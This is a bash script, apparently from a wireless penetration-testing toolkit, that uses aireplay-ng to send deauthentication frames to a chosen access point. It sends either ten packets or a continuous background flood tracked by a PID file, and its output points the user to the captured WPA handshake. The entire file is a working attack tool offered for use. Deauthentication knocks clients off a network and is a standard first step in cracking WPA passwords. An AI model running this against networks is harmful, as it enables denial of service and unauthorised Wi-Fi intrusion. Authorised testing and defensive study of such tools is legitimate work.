#!/usr/bin/env bash
# Deauth the target AP. With --continuous, runs in background (use deauth_stop.sh to stop).
# Usage: deauth.sh <monitor_interface> <bssid> [--continuous]
# Without --continuous: sends 10 deauth packets then exits.
set -euo pipefail

if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <monitor_interface> <bssid> [--continuous]" >&2
  echo "  Without --continuous: sends 10 packets. With --continuous: runs until stopped (deauth_stop.sh)." >&2
  exit 1
fi

IFACE="$1"
BSSID="$2"
CONTINUOUS=""
[ "${3:-}" = "--continuous" ] && CONTINUOUS=1

if ! command -v aireplay-ng >/dev/null 2>&1; then
  echo "aireplay-ng is not installed. Install aircrack-ng suite and try again." >&2
  exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../../.." && pwd)"
REPORTS_DIR="$PROJECT_ROOT/reports/wireless_attacks"
PID_FILE="$REPORTS_DIR/.current_deauth_pid"
mkdir -p "$REPORTS_DIR"

if [ -n "$CONTINUOUS" ]; then
  # Kill any previous continuous deauth
  [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null && kill "$(cat "$PID_FILE")" 2>/dev/null || true
  rm -f "$PID_FILE"
  echo "[+] Starting continuous deauth (run deauth_stop.sh to stop)..."
  aireplay-ng -0 0 -a "$BSSID" "$IFACE" >> "$REPORTS_DIR/deauth.log" 2>&1 &
  echo $! > "$PID_FILE"
  echo "DEAUTH_PID=$!"
  echo "[+] Continuous deauth running (PID $(cat "$PID_FILE")). Click 'Stop deauth' when done."
else
  echo "[+] Sending 10 deauth packets to BSSID $BSSID..."
  aireplay-ng -0 10 -a "$BSSID" "$IFACE"
  echo "[+] Deauth sent. Check capture for WPA handshake."
fi
